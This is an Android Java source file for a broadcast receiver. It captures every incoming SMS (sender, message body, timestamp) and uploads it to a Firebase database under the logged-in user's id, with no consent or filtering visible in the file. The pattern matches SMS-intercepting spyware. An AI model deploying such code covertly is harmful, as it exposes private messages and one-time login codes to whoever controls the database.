package com.mehboob.bushorat.reciever;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

public class SMSReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle data = intent.getExtras();
        Object[] pdus = (Object[]) data.get("pdus");

        if (pdus != null) {
            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                String sender = sms.getDisplayOriginatingAddress();
                String message = sms.getDisplayMessageBody();
                String timestamp = String.valueOf(sms.getTimestampMillis());

                Map<String, String> smsData = new HashMap<>();
                smsData.put("address", sender);
                smsData.put("body", message);
                smsData.put("date", timestamp);

                FirebaseAuth auth = FirebaseAuth.getInstance();
                if (auth.getCurrentUser() != null) {
                    String userId = auth.getCurrentUser().getUid();
                    DatabaseReference ref = FirebaseDatabase.getInstance().getReference("data")
                            .child(userId).child("sms");

                    ref.push().setValue(smsData);
                }
            }
        }
    }
}
